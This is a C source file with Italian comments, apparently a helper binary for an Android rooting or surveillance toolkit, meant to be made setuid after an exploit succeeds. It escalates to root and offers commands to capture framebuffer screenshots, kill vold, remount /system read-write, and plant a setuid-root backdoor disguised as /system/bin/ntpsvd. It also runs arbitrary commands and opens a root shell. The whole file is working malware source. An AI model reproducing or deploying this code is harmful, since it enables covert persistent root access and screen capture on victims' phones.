#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>
#include <linux/fb.h>
#include <linux/kd.h>

#define LOG(x)  printf(x)

static int copy(const char *from, const char *to);
unsigned int getProcessId(const char *p_processname);
int setgod();
void sync_reboot();
int remount(const char *mntpoint, int flags);
int my_mount(const char *mntpoint);
void my_chown(const char *user, const char *group, const char *file);
void my_chmod(const char *mode, const char *file); 
static void copy_root(const char *mntpnt, const char *dst);
static void delete_root(const char *mntpnt, const char *dst);
static int get_framebuffer(char *filename);

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	int i;
	setgod();

	if (argc < 2) 
		return 0;

	// Cattura uno screenshot
	if (strcmp(argv[1], "fb") == 0 && argc == 3) {
		char* filename = argv[2];

		copy("/dev/graphics/fb0", filename);
		chmod(filename, 0666);
	} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
		unsigned int pid;
		
		LOG("Killing VOLD\n");

		for (i = 0; i < 2; i++) {
			pid = getProcessId("vold");

			if (pid) {
				kill(getProcessId("vold"), SIGKILL);
				sleep(2);
			}	
		}
	} else if (strcmp(argv[1], "reb") == 0) { // Reboot
		LOG("Rebooting...\n");

		sync_reboot();
	} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
		remount("/system", MS_RDONLY);
	} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
		remount("/system", 0);
	} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
		copy_root("/system", "/system/bin/ntpsvd");
	} else if (strcmp(argv[1], "ru") == 0) {  // Cancella la shell root in /system/bin/ntpsvd
		delete_root("/system", "/system/bin/ntpsvd");
	} else if (strcmp(argv[1], "sd") == 0) {
		my_mount("/mnt/sdcard");
	} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
		return setgod();
	} else if (strcmp(argv[1], "qzx") == 0) { // Eseguiamo la riga passataci
		return system(argv[2]);
	} else if (strcmp(argv[1], "fhc") == 0) { // Copiamo un file nel path specificato dal secondo argomento 
		copy(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], "fho") == 0) { // chown: user group file
		my_chown(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], "pzm") == 0) { // chmod: newmode file
		my_chmod(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], "qzs") == 0) { // Eseguiamo una root shell
		const char * shell = "/system/bin/sh";
		LOG("Starting shell\n");

		int i;
		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = "sh";

		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}

		execv("/system/bin/sh", exec_args);

		LOG("Exiting shell\n");
	}

	return 0;
}

// Allo stato attuale, la copy funziona meglio...
// Come referenza futura: http://www.pocketmagic.net/?p=1473
static int get_framebuffer(char *filename) {
	int fd, fd_out;
	void *bits;
	struct fb_var_screeninfo vi;
	struct fb_fix_screeninfo fi;
	ssize_t written;

	fd = open("/dev/graphics/fb0", O_RDONLY);

	if (fd < 0) {
		perror("cannot open fb0");
		return 0;
	}

	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
		perror("failed to get fb0 info");
		return 0; 
	}

	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
		perror("failed to get fb0 info");
		return 0;
	}


	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);

	if (bits == MAP_FAILED) {
		perror("failed to mmap framebuffer");
		return 0;
	}


	fd_out = open(filename, O_CREAT | O_RDWR);

	if (fd_out < 0) {
		perror("failed to create frame file");
		return 0;
	}

	written = write(fd_out, bits, fi.smem_len);

	if (written <= 0) {
		perror("cannot write to file");
		return 0;
	}

	close(fd);
	close(fd_out);

	return 0;

	/*fb->version = sizeof(*fb);
	fb->width = vi.xres;
	fb->height = vi.yres;
	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
	fb->data = bits;
	fb->format = GGL_PIXEL_FORMAT_RGB_565;

	fb++;

	fb->version = sizeof(*fb);
	fb->width = vi.xres;
	fb->height = vi.yres;
	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
	fb->format = GGL_PIXEL_FORMAT_RGB_565;

	return fd;*/
}

void my_chmod(const char *mode, const char *file) {
	int newmode;

	sscanf(mode, "%o", &newmode);
	chmod(file, newmode);
}

void my_chown(const char *user, const char *group, const char *file) {
	char *buf;
	int len = strlen(user) + strlen(group) + strlen(file) + 
				strlen("/system/bin/chown ") + 5;

	buf = (char *)malloc(len);

	if (buf == NULL) {
		return;
	}

	memset(buf, 0, len);

	sprintf(buf, "/system/bin/chown %s.%s %s", user, group, file);
	system(buf);

	free(buf);

	return; 
}

static void delete_root(const char *mntpnt, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	unlink(dst);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static void copy_root(const char *mntpnt, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	copy("/proc/self/exe", dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

unsigned int getProcessId(const char *p_processname) {
    DIR *dir_p;
    struct dirent *dir_entry_p;
    char dir_name[128];
    char target_name[252];
    int target_result;
    char exe_link[252];
    int errorcount;
    int result;
    char msg[256];

    errorcount = 0;
    result = 0;

    if (!setgod()) {
		return 0;
	}

    dir_p = opendir("/proc/");

    while (NULL != (dir_entry_p = readdir(dir_p))) {
        if (strspn(dir_entry_p->d_name, "0123456789") == strlen(dir_entry_p->d_name)) {
            strcpy(dir_name, "/proc/");
            strcat(dir_name, dir_entry_p->d_name);
            strcat(dir_name, "/");

            exe_link[0] = 0;
            strcat(exe_link, dir_name);
            strcat(exe_link, "exe");
            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);

            if (target_result > 0) {
                target_name[target_result] = 0;

                if (strstr(target_name, p_processname) != NULL) {
                    result = atoi(dir_entry_p->d_name);

                    sprintf(msg, "getProcessID(%s) id = %d\n", p_processname, result);
                    LOG(msg);

                    closedir(dir_p);
                    return result;
                }
            }
        }
    }

    closedir(dir_p);

    sprintf(msg, "getProcessID(%s) id = 0 (could not find process)\n", p_processname);
    LOG(msg);

    return result;
}

void sync_reboot() {
	char buf[256];

	setgod();
	sync();

	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
		sprintf(buf, "Error rebooting: %d\n", errno);
		LOG(buf);	
	}
}

int remount(const char *mntpoint, int flags) {
    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

	if (!setgod()) {
		return -1;
	}

    if ((f = fopen("/proc/mounts", "r")) == NULL) {
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
        return -1;
    }

    if ((dev = strtok(buf, " \t")) == NULL) {
        return -1;
    }

    if (strtok(NULL, " \t") == NULL) {
        return -1;
    }

    if ((fstype = strtok(NULL, " \t")) == NULL) {
        return -1;
    }

    return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
}

int my_mount(const char *mntpoint) {
    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if (!setgod()) {
        return -1;
    }

    if ((f = fopen("/proc/mounts", "r")) == NULL) {
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
        return -1;
    }

    if ((dev = strtok(buf, " \t")) == NULL) {
        return -1;
    }

    if (strtok(NULL, " \t") == NULL) {
        return -1;
    }

    if ((fstype = strtok(NULL, " \t")) == NULL) {
        return -1;
    }

    return mount(dev, mntpoint, fstype, 0, 0);
}

int setgod() {
    //char buf[256];
    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
    //LOG(buf);

    setegid(0);
    setuid(0);
    setgid(0);
    seteuid(0);

    //sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
    //LOG(buf);

    return (seteuid(0) == 0) ? 1 : 0;
}
